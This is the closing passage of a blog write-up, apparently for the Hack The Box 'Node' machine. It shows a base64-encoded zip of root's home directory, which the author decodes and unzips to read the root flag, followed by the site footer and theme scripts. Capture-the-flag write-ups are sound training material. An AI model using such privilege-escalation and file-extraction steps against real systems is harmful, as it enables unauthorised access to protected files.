YZVxYNGnLRF9Tro/1ovQ80YxNh12Q7PSftgM1zlnGIMp80fVKkzPMdQs/gzusVfhR6v5SR7C6Gy5/9VM2dgXCrBIITLFbpWnhIIDP38LxvJTU9i53NtxBwLoWSchKquMPxeD8BZCU6th761n4AYkJ8tUD5v+FHDmA+FqbXPSFU6q3/pl1W9r4Bu8HoZAmhWbARfqdUyGmQHWJBtGdBRoaxIycsQXltjvJsBcUOFzEY1SwUEsHCOD+VKdEAQAAhQIAAFBLAwQKAAAAAAAZiRBVAAAAAAAAAAAAAAAACwAcAHJvb3QvLm5hbm8vVVQJAAMSwftiM+rjZHV4CwABBAAAAAAEAAAAAFBLAwQKAAkAAADGSjtL2e0fPBMAAAAHAAAAGQAcAHJvb3QvLm5hbm8vc2VhcmNoX2hpc3RvcnlVVAkAA7Nfy1mgX8tZdXgLAAEEAAAAAAQAAAAA0H4W2ADZr9PRmBFrfQ+f5gpi2lBLBwjZ7R88EwAAAAcAAABQSwECHgMKAAAAAADEZRFVAAAAAAAAAAAAAAAABQAYAAAAAAAAABAAwEEAAAAAcm9vdC9VVAUAA//U/GJ1eAsAAQQAAAAABAAAAABQSwECHgMUAAkACADRgxFHf7CuZIMAAACUAAAADQAYAAAAAAABAAAApIE/AAAAcm9vdC8ucHJvZmlsZVVUBQADGf7RVXV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAABmJEFUAAAAAAAAAAAAAAAAMABgAAAAAAAAAEADAQRkBAAByb290Ly5jYWNoZS9VVAUAAxLB+2J1eAsAAQQAAAAABAAAAABQSwECHgMKAAkAAAA0fCNLAAAAAAwAAAAAAAAAIAAYAAAAAAAAAAAApIFfAQAAcm9vdC8uY2FjaGUvbW90ZC5sZWdhbC1kaXNwbGF5ZWRVVAUAA8MSrFl1eAsAAQQAAAAABAAAAABQSwECHgMKAAkAAADdsxVXHA423C0AAAAhAAAADQAYAAAAAAABAAAAoIHVAQAAcm9vdC9yb290LnR4dFVUBQADkdfjZHV4CwABBAAAAAAEAAAAAFBLAQIeAxQACQAIAOuRVke95RA+mwUAACIMAAAMABgAAAAAAAEAAACkgVkCAAByb290Ly5iYXNocmNVVAUAA6kZKVZ1eAsAAQQAAAAABAAAAABQSwECHgMUAAkACADEZRFV4P5Up0QBAACFAgAADQAYAAAAAAABAAAAgIFKCAAAcm9vdC8udmltaW5mb1VUBQAD/9T8YnV4CwABBAAAAAAEAAAAAFBLAQIeAwoAAAAAABmJEFUAAAAAAAAAAAAAAAALABgAAAAAAAAAEADtQeUJAAByb290Ly5uYW5vL1VUBQADEsH7YnV4CwABBAAAAAAEAAAAAFBLAQIeAwoACQAAAMZKO0vZ7R88EwAAAAcAAAAZABgAAAAAAAEAAACAgSoKAAByb290Ly5uYW5vL3NlYXJjaF9oaXN0b3J5VVQFAAOzX8tZdXgLAAEEAAAAAAQAAAAAUEsFBgAAAAAJAAkA/gIAAKAKAAAAAA<span class=o>==</span>
</span></span></code></pre></div><p>Now the output is more bigger, let’s decode and unzip it.</p><p><img alt=/HTB/node-24.png loading=lazy src=/HTB/node-24.png></p><p>Now looks more like a root’s directory :D. Let’s cat the <strong>root’s flag</strong>.</p><p><img alt=/HTB/node-25.png loading=lazy src=/HTB/node-25.png></p><p><strong>Thank you for reading, and happy hacking! 😄</strong></p></div><footer class=post-footer><ul class=post-tags><li><a href=http://localhost:1313/tags/privesc/>Privesc</a></li><li><a href=http://localhost:1313/tags/web/>Web</a></li><li><a href=http://localhost:1313/tags/linux/>Linux</a></li><li><a href=http://localhost:1313/tags/buffer-overflow/>Buffer Overflow</a></li></ul></footer></article></main><footer class=footer><span>&copy; 2025 <a href=http://localhost:1313/>PwndSide</a></span> ·
<span>Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
<a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentColor"><path d="M12 6H0l6-6z"/></svg>
</a><script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(e){e.preventDefault();var t=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(t)}']`).scrollIntoView({behavior:"smooth"}),t==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${t}`)})})</script><script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script><script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script></body></html>